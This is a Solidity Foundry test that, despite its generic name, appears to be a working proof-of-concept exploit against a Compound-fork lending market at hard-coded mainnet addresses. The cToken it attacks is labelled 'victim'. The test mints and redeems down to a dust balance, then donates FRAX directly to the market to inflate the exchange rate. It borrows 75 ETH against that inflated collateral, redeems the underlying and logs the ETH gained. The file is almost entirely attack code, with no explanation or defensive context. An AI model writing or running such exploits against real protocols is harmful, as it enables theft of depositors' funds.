// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/IPoolV2.sol";
import "../src/IFlashLoanReceiver.sol";
import "../src/IERC20.sol";
import "../src/IUniswapV2Router.sol";
import "../src/IUniswapV2Pair.sol";
import "../src/IUnitroller.sol";
import "../src/ICerc20.sol";

interface IWETH is IERC20 {
    function withdraw (uint256 _wag) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}


contract CounterTest is Test {

    // Addresses
    address public DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F; //Main
    address public WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;//Main 
    address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;//Main
    address public USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7; //Main  
    address public USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; //Main
    address public MEEB = 0x641927E970222B10b2E8CDBC96b1B4F427316f16;
    // address public xMEEB = 0x11Df658567e615f69D23289BE8A27a9C260cE297;
    address public FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;

    // address public kERC20_1 = 0x8486B523a32e9D0d021078Fe68a3b98fC765FbaB;//Main
    address public kERC20_1 = 0x140128b2e6562713051df4858ff52f26795B8920;//Main

    // address public UNITROLLER = 0xB70FB69a522ed8D4613C4C720F91F93a836EE2f5;//Main
    address public UNITROLLER = 0x9dEb56b9DD04822924B90ad15d01EE50415f8bC7;

    CErc20Interface victim = CErc20Interface(kERC20_1);
 

    IWETH weth = IWETH(WETH);
    IERC20 dai = IERC20(DAI);
    // IERC20 xmeeb = IERC20(xMEEB);
    IERC20 usdc = IERC20(USDC);
    IERC20 frax = IERC20(FRAX);


    ComptrollerInterface unitroller = ComptrollerInterface(UNITROLLER);

    // function setUp() public {
    //     // counter = new Counter();
    //     // counter.setNumber(0);
    // }


    function testTrade2 () public
    {   
  
        uint256 ethAmount0 = payable(address(this)).balance;    
 
        // deal(xmeeb, address(this), 10000e18);
        // deal(xMEEB, address(this),  67220356881247229862);
        // deal(USDC, address(this), 1000000*10**6);
        deal(FRAX, address(this), 1000000e18);
        // balanceOfThis(USDC);
        address[] memory cTokens = new address[](1);
        cTokens[0] = kERC20_1;  
        uint[] memory errors = unitroller.enterMarkets(cTokens);
        // console.log(errors[0]);
        frax.approve(kERC20_1, balanceOfThis(FRAX));    
        victim.mint(balanceOfThis(FRAX));
        // console.log("cToken balance :");
        // console.log(victim.balanceOf(address(this)));
        // console.log("Victim total supply :");
        // console.log(victim.totalSupply());
        {
        
        console.log(errors[0]);
        // console.log(errors[1]);
        // console.log(errors[2]);
        (uint a0, uint b0, uint c0) = unitroller.getAccountLiquidity(address(this));
        console.log("a :",a0);
        console.log("b :",b0);
        console.log("c :",c0);
        }
        victim.redeem(victim.balanceOf(address(this))-2);
        console.log(victim.exchangeRateStored());
        uint256 transferAmount = balanceOfThis(FRAX);
        frax.transfer(kERC20_1, transferAmount);
    
        
        console.log(victim.exchangeRateStored());
    
        // console.log(victim.balanceOf(address(this)));
        (uint a, uint b, uint c) = unitroller.getAccountLiquidity(address(this));
        console.log("a :",a);
        console.log("b :",b);
        console.log("c :",c);
        // victim.borrow(1);
        // CErc20Interface(0xD72929e284E8bc2f7458A6302bE961B91bccB339).borrow(60*10**18);//cETH
        CErc20Interface(0x0a1EF7feD1B691253F9367daf682BA08A9D2fD9C).borrow(75*10**18);//cETH
        console.log("Before :",victim.balanceOf(address(this)));
        victim.redeemUnderlying(transferAmount);
        balanceOfThis(FRAX);
        console.log("After :",victim.balanceOf(address(this)));
        uint256 ethAmount = payable(address(this)).balance;
        console.log("Final ETH balance :",ethAmount-ethAmount0);
    
    }

      function balanceOfThis(address _erc20TokenAddress) internal view returns (uint256 bal) {
        IERC20 ERC20Token;    
        ERC20Token = IERC20(_erc20TokenAddress);
   
        bal = ERC20Token.balanceOf(address(this));
        console.log("Executor Token balance", bal);
        return bal;   

    }

    receive()external payable {}

}